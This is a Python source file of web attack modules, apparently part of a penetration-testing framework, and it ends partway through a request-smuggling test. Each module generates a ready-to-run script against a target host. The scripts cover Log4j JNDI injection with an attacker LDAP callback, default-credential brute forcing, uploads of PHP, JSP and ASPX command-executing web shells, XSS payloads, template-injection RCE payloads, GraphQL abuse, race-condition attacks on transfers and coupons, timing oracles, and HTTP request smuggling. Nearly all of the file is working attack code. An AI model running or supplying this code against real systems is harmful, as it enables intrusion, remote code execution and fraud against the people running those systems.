"""Attack modules: web."""

from __future__ import annotations

from tools.attack_modules.base import AttackModule, ModuleContext
from typing import Any

class Log4jRCE(AttackModule):
    name = "Log4jRCE"
    description = "Log4j JNDI injection RCE (CVE-2021-44228)"
    target_services = ["http", "https"]
    target_ports = [8080, 8443, 80, 443]
    required_cves = ["CVE-2021-44228"]

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Inject ${jndi:ldap://attacker:1389/a} into any HTTP header or parameter.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import socket, sys
# Lightweight Log4j JNDI payload sender
# Target: {ctx.target_ip}
# Usage: python log4j_poc.py <target_host> <target_port>
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
payload = b"GET / HTTP/1.1\\r\\n"
payload += b"Host: " + host.encode() + b"\\r\\n"
payload += b"X-Api-Version: ${{jndi:ldap://" + host.encode() + b":1389/a}}\\r\\n\\r\\n"
s = socket.socket()
s.connect((host, port))
s.send(payload)
print(s.recv(4096).decode(errors="replace"))
s.close()
"""

class BasicAuthBuster(AttackModule):
    name = "BasicAuthBuster"
    description = "Brute-force HTTP Basic Auth with small default wordlist"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests basic creds against HTTP basic auth. May trip rate limits.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import urllib.request, base64, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
creds = [("admin","admin"),("root","root"),("user","user"),("admin","password"),("guest","guest")]
for u,p in creds:
    req = urllib.request.Request(f"http://{{host}}:{{port}}/")
    creds_b64 = base64.b64encode(f"{{u}}:{{p}}".encode()).decode()
    req.add_header("Authorization", f"Basic {{creds_b64}}")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status < 400:
                print(f"SUCCESS: {{u}}/{{p}}")
                break
    except Exception:
        pass
"""

class APIFuzzer(AttackModule):
    name = "APIFuzzer"
    description = "Fuzz common REST API endpoints for information disclosure or injection"
    target_services = ["http", "https", "api"]
    target_ports = [80, 443, 8080, 3000, 5000, 8000, 8443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Fuzzes /api, /v1, /graphql, etc. for 200/403 differences.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import urllib.request, json, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
paths = ["/api","/api/v1","/v1","/graphql","/rest","/swagger.json","/openapi.json","/api/users","/api/admin"]
for p in paths:
    try:
        req = urllib.request.Request(f"http://{{host}}:{{port}}{{p}}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read(2048).decode(errors="replace")
            print(f"{{p}} -> {{resp.status}} ({{len(body)}} bytes)")
    except urllib.error.HTTPError as e:
        print(f"{{p}} -> {{e.code}}")
    except Exception:
        pass
"""

class WebShellUpload(AttackModule):
    name = "WebShellUpload"
    description = "Upload PHP/JSP/ASPX web shell via file upload vulnerabilities"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 8000, 3000]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Attempts to upload web shells with various extensions and bypasses.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import requests, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
scheme = "https" if port in (443, 8443) else "http"
url = f"{{scheme}}://{{host}}:{{port}}"
shells = [
    ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>", "application/jsp"),
    ("shell.aspx", b"<%@ Page Language=\\"C#\\" %><% System.Diagnostics.Process.Start(\\"cmd.exe\\", \\"/c \\" + Request[\\"cmd\\"]); %>", "application/aspx"),
]
for filename, content, ctype in shells:
    try:
        files = {{"file": (filename, content, ctype)}}
        r = requests.post(f"{{url}}/upload", files=files, timeout=10, allow_redirects=False)
        if r.status_code in (200, 201, 302):
            print(f"UPLOAD SUCCESS: {{filename}} (status {{r.status_code}})")
            break
    except Exception as e:
        print(f"{{filename}} failed: {{e}}")
"""

class SQLInjection(AttackModule):
    name = "SQLInjection"
    description = "Automated SQL injection testing with sqlmap integration"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Use sqlmap for comprehensive SQL injection testing.",
            "suggested_command": f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --level=3 --risk=2",
            "techniques": ["union", "error", "time", "stacked"],
        }

class XSSScanner(AttackModule):
    name = "XSSScanner"
    description = "Reflected and stored XSS payload injection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests common XSS payloads against URL parameters and forms.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import requests, urllib.parse, sys
# Target: {ctx.target_ip}
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
scheme = "https" if port in (443, 8443) else "http"
base = f"{{scheme}}://{{host}}:{{port}}"
payloads = [
    '''<script>alert('XSS')</script>''',
    '''<img src=x onerror=alert('XSS')>''',
    ''''"><script>alert('XSS')</script>''',
    '''<body onload=alert('XSS')>''',
]
for payload in payloads:
    try:
        url = f"{{base}}/search?q={{urllib.parse.quote(payload)}}"
        r = requests.get(url, timeout=10)
        if payload in r.text:
            print(f"XSS REFLECTED: {{payload[:50]}}")
            break
    except Exception as e:
        pass
"""


# ---------------------------------------------------------------------------
# Credential Operations
# ---------------------------------------------------------------------------

class SSTIProbe(AttackModule):
    name = "SSTIProbe"
    description = "Server-Side Template Injection detection and exploitation (Jinja2, Twig, Freemarker, Velocity)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Probes for SSTI across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""SSTI Probe — detect and fingerprint template injection across engines."""
import sys, urllib.request, urllib.parse, urllib.error, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"

# Polyglot payloads that trigger different engines
MATH_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${{7*7}}", "49", "Freemarker"),
    ("#{{7*7}}", "49", "Velocity"),
    ("{{=7*7}}", "49", "Mako"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("<% out.println(7*7); %>", "49", "JSP/EL"),
]

# RCE test payloads (only after confirming SSTI)
RCE_PAYLOADS = [
    ("Jinja2", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("Jinja2", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    ("Twig", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
    ("Freemarker", "<#assign ex='freemarker.template.utility.Execute'?new()> ${{ex('id')}}"),
    ("Velocity", "#set($x='')$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')"),
    ("Smarty", "{{system('id')}}"),
]

def test_endpoint(url: str, param_name: str = "q"):
    """Test a single endpoint for SSTI."""
    print(f"\\nTesting: {{url}}")
    for payload, expected, engine in MATH_PAYLOADS:
        try:
            test_url = f"{{url}}?{{param_name}}={{urllib.parse.quote(payload)}}"
            req = urllib.request.Request(test_url)
            with urllib.request.urlopen(req, timeout=8) as resp:
                body = resp.read(8192).decode(errors="replace")
                if expected in body:
                    print(f"  [SSTI DETECTED] {{engine}} — payload '{{payload}}' reflected with {{expected}}")
                    return engine
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            if expected in body:
                print(f"  [SSTI DETECTED] {{engine}} — payload '{{payload}}' reflected in error {{e.code}}")
                return engine
        except Exception:
            pass
    return None

# Test common endpoints
endpoints = ["/", "/search", "/profile", "/user", "/page", "/render", "/preview", "/template"]
params = ["q", "search", "name", "username", "id", "page", "input", "data", "template"]

found_engine = None
for ep in endpoints:
    for param in params:
        engine = test_endpoint(f"{{BASE}}{{ep}}", param)
        if engine:
            found_engine = engine
            break
    if found_engine:
        break

if found_engine:
    print(f"\\n[+] Confirmed SSTI in {{found_engine}}. Attempting RCE probes...")
    for engine_name, rce_payload in RCE_PAYLOADS:
        if engine_name == found_engine:
            try:
                test_url = f"{{BASE}}/?q={{urllib.parse.quote(rce_payload)}}"
                req = urllib.request.Request(test_url)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read(8192).decode(errors="replace")
                    print(f"  RCE probe sent: {{rce_payload[:60]}}...")
                    print(f"  Response: {{body[:500]}}")
            except Exception as e:
                print(f"  RCE probe error: {{e}}")
else:
    print("\\n[-] No SSTI detected on common endpoints.")
'''

class GraphQLIntrospect(AttackModule):
    name = "GraphQLIntrospect"
    description = "GraphQL schema extraction, query depth abuse, batching attacks, and introspection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 4000, 5000]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Extracts GraphQL schema via introspection, tests query depth limits, and batch attacks.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        target = ctx.target_ip
        return (
            '"""GraphQL Introspection & Attack Toolkit."""\n'
            'import json, sys, urllib.request, urllib.error\n'
            '\n'
            f'TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target}"\n'
            'PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n'
            'SCHEME = "https" if PORT in (443, 8443) else "http"\n'
            'BASE = f"{SCHEME}://{TARGET}:{PORT}"\n'
            '\n'
            'INTROSPECTION_QUERY = """\n'
            'query IntrospectionQuery {\n'
            '  __schema {\n'
            '    queryType { name }\n'
            '    mutationType { name }\n'
            '    subscriptionType { name }\n'
            '    types {\n'
            '      name kind description\n'
            '      fields { name description type { name kind ofType { name kind } } args { name description type { name kind } } }\n'
            '      inputFields { name description type { name kind } }\n'
            '      enumValues { name description }\n'
            '    }\n'
            '    directives { name description locations args { name description type { name kind } } }\n'
            '  }\n'
            '}\n'
            '"""\n'
            '\n'
            'DEPTH_ATTACK_QUERY = """\n'
            'query DeepQuery {\n'
            '  level0: __typename\n'
            '  {nested}\n'
            '}\n'
            '"""\n'
            '\n'
            'BATCH_ATTACK = [\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            ']\n'
            '\n'
            'ALIAS_ATTACK = "query AliasedQuery { " + " ".join(f"a{i}: __typename" for i in range(100)) + " }"\n'
            '\n'
            'def graphql_request(endpoint, query):\n'
            '    """Send a GraphQL request and return parsed response."""\n'
            '    if isinstance(query, str):\n'
            '        payload = {"query": query}\n'
            '    elif isinstance(query, list):\n'
            '        payload = query\n'
            '    else:\n'
            '        payload = query\n'
            '    data = json.dumps(payload).encode()\n'
            '    try:\n'
            '        req = urllib.request.Request(endpoint, data=data, headers={"Content-Type": "application/json"}, method="POST")\n'
            '        with urllib.request.urlopen(req, timeout=15) as resp:\n'
            '            return json.loads(resp.read().decode())\n'
            '    except urllib.error.HTTPError as e:\n'
            '        return {"error": e.code, "body": e.read().decode(errors="replace")[:500]}\n'
            '    except Exception as e:\n'
            '        return {"error": str(e)}\n'
            '\n'
            'graphql_endpoints = ["/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query", "/graphiql"]\n'
            'found_endpoint = None\n'
            'for ep in graphql_endpoints:\n'
            '    url = f"{BASE}{ep}"\n'
            '    result = graphql_request(url, "{ __typename }")\n'
            '    if "data" in result and "__typename" in str(result.get("data", {})):\n'
            '        found_endpoint = url\n'
            '        print(f"[+] GraphQL endpoint found: {url}")\n'
            '        break\n'
            '    elif "error" not in result:\n'
            '        print(f"[?] Possible GraphQL at {url}: {json.dumps(result)[:200]}")\n'
            '\n'
            'if not found_endpoint:\n'
            '    print("[-] No GraphQL endpoint found. Trying common paths anyway...")\n'
            '    found_endpoint = f"{BASE}/graphql"\n'
            '\n'
            'print(f"\\n=== Testing: {found_endpoint} ===\\n")\n'
            '\n'
            'print("[1] Schema Introspection...")\n'
            'intro_result = graphql_request(found_endpoint, INTROSPECTION_QUERY)\n'
            'if "data" in intro_result and intro_result["data"].get("__schema"):\n'
            '    schema = intro_result["data"]["__schema"]\n'
            '    types_count = len(schema.get("types", []))\n'
            '    print(f"  [+] Introspection ENABLED! {types_count} types exposed.")\n'
            '    for t in schema.get("types", [])[:20]:\n'
            '        name = t.get("name", "?")\n'
            '        kind = t.get("kind", "?")\n'
            '        fields = [f.get("name", "?") for f in t.get("fields", [])[:5]] if t.get("fields") else []\n'
            '        if fields:\n'
            '            print(f"    {kind} {name}: {\', \'.join(fields)}")\n'
            'else:\n'
            '    print(f"  [-] Introspection disabled or blocked: {json.dumps(intro_result)[:200]}")\n'
            '\n'
            'print("\\n[2] Query Depth Attack...")\n'
            'depth = 50\n'
            'nested = "\\n  ".join(f"level{i}: __typename {{ level{i+1}: __typename" for i in range(depth))\n'
            'nested += "\\n  " + "}" * depth\n'
            'depth_query = DEPTH_ATTACK_QUERY.replace("{nested}", nested)\n'
            'depth_result = graphql_request(found_endpoint, depth_query)\n'
            'if "error" in str(depth_result).lower() or "depth" in str(depth_result).lower():\n'
            '    print(f"  [+] Depth limit enforced: {json.dumps(depth_result)[:300]}")\n'
            'else:\n'
            '    print(f"  [!] No depth limit detected ({depth} levels accepted)")\n'
            '\n'
            'print("\\n[3] Batching Attack (10 queries in one request)...")\n'
            'batch_result = graphql_request(found_endpoint, BATCH_ATTACK)\n'
            'if isinstance(batch_result, list) and len(batch_result) == 10:\n'
            '    print(f"  [+] Batching ENABLED! {len(batch_result)} responses returned.")\n'
            'else:\n'
            '    print(f"  [-] Batching blocked: {json.dumps(batch_result)[:200]}")\n'
            '\n'
            'print("\\n[4] Alias Attack (100 aliases)...")\n'
            'alias_result = graphql_request(found_endpoint, ALIAS_ATTACK)\n'
            'if "data" in alias_result:\n'
            '    count = len(alias_result.get("data", {}))\n'
            '    print(f"  [+] Alias attack accepted: {count} aliases processed")\n'
            'else:\n'
            '    print(f"  [-] Alias attack blocked: {json.dumps(alias_result)[:200]}")\n'
            '\n'
            'print("\\n[!] Use extracted schema to find sensitive queries, mutations, and IDOR vectors.")\n'
        )


# ---------------------------------------------------------------------------
# Race Condition & Timing Attack Modules
# ---------------------------------------------------------------------------

class RaceRequest(AttackModule):
    name = "RaceRequest"
    description = "Send N concurrent requests to exploit TOCTOU race conditions (coupon reuse, limit bypass, double-spend)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Sends concurrent requests to exploit race conditions in rate limits, coupon codes, and transactions.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Race Condition Exploit — concurrent request sender for TOCTOU attacks."""
import concurrent.futures, json, sys, threading, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
CONCURRENT = int(sys.argv[3]) if len(sys.argv) > 3 else 20

results = {{"success": 0, "failure": 0, "responses": []}}
lock = threading.Lock()

def send_request(url: str, method: str = "POST", data: bytes = b"", headers: dict = None) -> dict:
    """Send a single request and return status."""
    hdrs = headers or {{}}
    try:
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read(2048).decode(errors="replace")
            with lock:
                results["success"] += 1
                results["responses"].append({{"status": resp.status, "body": body[:200]}})
            return {{"status": resp.status, "success": True}}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        with lock:
            results["failure"] += 1
            results["responses"].append({{"status": e.code, "body": body[:200]}})
        return {{"status": e.code, "success": False}}
    except Exception as e:
        with lock:
            results["failure"] += 1
        return {{"error": str(e)}}

# Test endpoints commonly vulnerable to race conditions
test_cases = [
    {{
        "name": "Coupon/Code Redemption",
        "url": f"{{BASE}}/api/redeem",
        "method": "POST",
        "data": json.dumps({{"code": "TEST100", "user": "attacker"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Vote/Like Endpoint",
        "url": f"{{BASE}}/api/vote",
        "method": "POST",
        "data": json.dumps({{"item_id": "1", "vote": "up"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Transfer/Transaction",
        "url": f"{{BASE}}/api/transfer",
        "method": "POST",
        "data": json.dumps({{"to": "attacker", "amount": 100}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Rate Limit Bypass",
        "url": f"{{BASE}}/api/login",
        "method": "POST",
        "data": json.dumps({{"username": "admin", "password": "test"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
]

print(f"=== Race Condition Attack: {{BASE}} ===\\n")

for tc in test_cases:
    print(f"\\n[Test] {{tc['name']}}: {{tc['url']}}")
    print(f"  Sending {{CONCURRENT}} concurrent requests...")

    results = {{"success": 0, "failure": 0, "responses": []}}
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT) as executor:
        futures = [
            executor.submit(
                send_request,
                tc["url"],
                tc.get("method", "POST"),
                tc.get("data", b""),
                tc.get("headers"),
            )
            for _ in range(CONCURRENT)
        ]
        concurrent.futures.wait(futures)

    elapsed = time.time() - start
    print(f"  Completed in {{elapsed:.2f}}s")
    print(f"  Success: {{results['success']}}, Failure: {{results['failure']}}")

    # Analyze for race condition indicators
    statuses = [r.get("status") for r in results["responses"]]
    unique_statuses = set(statuses)
    if len(unique_statuses) > 1:
        print(f"  [!] Mixed status codes: {{unique_statuses}} — possible race condition!")
    if results["success"] > 1:
        print(f"  [!] {{results['success']}} requests succeeded — limit may be bypassed!")

    # Show sample responses
    for i, r in enumerate(results["responses"][:3]):
        print(f"  Response {{i+1}}: status={{r.get('status')}} body={{r.get('body', '')[:100]}}")

print("\\n[!] For advanced race testing, use Turbo Intruder (Burp) or custom async scripts.")
'''

class TimingOracle(AttackModule):
    name = "TimingOracle"
    description = "Detect timing side-channels in auth/validation endpoints for user enumeration and blind extraction"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Measures response time differences to detect user enumeration, blind SQLi, and timing oracles.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Timing Oracle Detector — find side-channels in auth and validation."""
import json, statistics, sys, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
SAMPLES = 10
THRESHOLD_MS = 50  # Significant timing difference threshold

def measure_request(url: str, method: str = "POST", data: bytes = b"", headers: dict = None) -> list[float]:
    """Measure response time over multiple samples."""
    times = []
    hdrs = headers or {{}}
    for _ in range(SAMPLES):
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            start = time.perf_counter()
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp.read()
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
        except urllib.error.HTTPError as e:
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
            e.read()
        except Exception:
            pass
        time.sleep(0.1)  # Small delay between samples
    return times

def analyze_timing(name: str, times_a: list[float], times_b: list[float]) -> dict:
    """Compare two timing distributions."""
    if len(times_a) < 3 or len(times_b) < 3:
        return {{"significant": False, "reason": "insufficient samples"}}

    mean_a = statistics.mean(times_a)
    mean_b = statistics.mean(times_b)
    stdev_a = statistics.stdev(times_a) if len(times_a) > 1 else 0
    stdev_b = statistics.stdev(times_b) if len(times_b) > 1 else 0
    diff = abs(mean_a - mean_b)

    significant = diff > THRESHOLD_MS and diff > (stdev_a + stdev_b)
    return {{
        "name": name,
        "mean_a_ms": round(mean_a, 2),
        "mean_b_ms": round(mean_b, 2),
        "diff_ms": round(diff, 2),
        "significant": significant,
        "stdev_a": round(stdev_a, 2),
        "stdev_b": round(stdev_b, 2),
    }}

print(f"=== Timing Oracle Detection: {{BASE}} ===\\n")

# Test 1: User enumeration via login
print("[1] Login Timing — valid vs invalid user...")
valid_user_times = measure_request(
    f"{{BASE}}/api/login",
    data=json.dumps({{"username": "admin", "password": "wrongpass"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
invalid_user_times = measure_request(
    f"{{BASE}}/api/login",
    data=json.dumps({{"username": "nonexistent_user_xyz_123", "password": "test"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Login Enumeration", valid_user_times, invalid_user_times)
print(f"  Valid user mean: {{result['mean_a_ms']}}ms, Invalid: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Usernames can be enumerated via timing.")
else:
    print(f"  [-] No significant timing difference.")

# Test 2: Password reset timing
print("\\n[2] Password Reset Timing — existing vs non-existing email...")
exist_times = measure_request(
    f"{{BASE}}/api/reset-password",
    data=json.dumps({{"email": "admin@example.com"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
noexist_times = measure_request(
    f"{{BASE}}/api/reset-password",
    data=json.dumps({{"email": "noexist_xyz_123@example.com"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Password Reset", exist_times, noexist_times)
print(f"  Exist mean: {{result['mean_a_ms']}}ms, No-exist: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Email enumeration via password reset.")
else:
    print(f"  [-] No significant timing difference.")

# Test 3: API key / token validation
print("\\n[3] Token Validation Timing — valid prefix vs random...")
valid_prefix_times = measure_request(
    f"{{BASE}}/api/validate",
    data=json.dumps({{"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
random_times = measure_request(
    f"{{BASE}}/api/validate",
    data=json.dumps({{"token": "x" * 100}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Token Validation", valid_prefix_times, random_times)
print(f"  Valid prefix mean: {{result['mean_a_ms']}}ms, Random: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Token validation leaks information.")
else:
    print(f"  [-] No significant timing difference.")

print("\\n[!] Timing oracles can be exploited for blind data extraction (e.g., blind SQLi character-by-character).")
'''

class RequestSmuggling(AttackModule):
    name = "RequestSmuggling"
    description = "HTTP request smuggling detection and exploitation (CL.TE, TE.CL, TE.TE)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests CL.TE, TE.CL, and TE.TE smuggling variants. Can poison caches and hijack requests.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""HTTP Request Smuggling Detector — CL.TE / TE.CL / TE.TE attacks."""
import socket, ssl, sys, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
USE_TLS = PORT in (443, 8443)

def send_raw(host: str, port: int, payload: bytes, use_tls: bool = False) -> bytes:
    """Send raw HTTP bytes and return response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    sock.sendall(payload)
    time.sleep(1)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    sock.close()
    return response

def test_cl_te(host: str, port: int, use_tls: bool) -> dict:
    """CL.TE: Content-Length vs Transfer-Encoding mismatch (front-end uses CL, back-end uses TE)."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 6\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
        f"G"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    # If back-end uses TE, it sees "0\\r\\n\\r\\nG" — the "G" is left in the buffer
    # causing a timeout or error on the next request
    return {{"type": "CL.TE", "response_len": len(response), "response_preview": text[:300]}}

def test_te_cl(host: str, port: int, use_tls: bool) -> dict:
    """TE.CL: Transfer-Encoding vs Content-Length mismatch (front-end uses TE, back-end uses CL)."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"5c\\r\\n"
        f"GPOST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 15\\r\\n"
        f"\\r\\n"
        f"x=1\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    return {{"type": "TE.CL", "response_len": len(response), "response_preview": text[:300]}}

def test_te_te(host: str, port: int, use_tls: bool) -> dict:
    """TE.TE: Obfuscated Transfer-Encoding header to confuse one proxy."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"Transfer-encoding: x\\r\\n"
        f"\\r\\n"
        f"5c\\r\\n"
        f"GPOST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    return {{"type": "TE.TE", "response_len": len(response), "response_preview": text[:300]}}

print(f"=== HTTP Request Smuggling Detection: {{TARGET}}:{{PORT}} ===\\n")

# Baseline
print("[0] Baseline request...")
baseline = send_raw(
    TARGET, PORT,
    f"POST / HTTP/1.1\\r\\nHost: {{TARGET}}\\r\\nContent-Length: 0\\r\\n\\r\\n".encode(),
    USE_TLS,
)
print(f"  Baseline response: {{len(baseline)}} bytes")

# Run tests
tests = [
    ("CL.TE", test_cl_te),
    ("TE.CL", test_te_cl),
    ("TE.TE", test_te_te),
]

for name, test_fn in tests:
    print(f"\\n[Test] {{name}}...")
    try:
        result = test_fn(TARGET, PORT, USE_TLS)
        print(f"  Response: {{result['response_len']}} bytes")
        print(f"  Preview: {{result['response_preview'][:200]}}")

        # Heuristic: if response differs significantly from baseline, smuggling may exist
        if abs(result["response_len"] - len(baseline)) > 200:
            print(f"  [!] Response differs from baseline — possible {{name}} smuggling!")
        if "Unrecognized method" in result["response_preview"] or "GPOST" in result["response_preview"]:
            print(f"  [+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")
    except Exception as e:
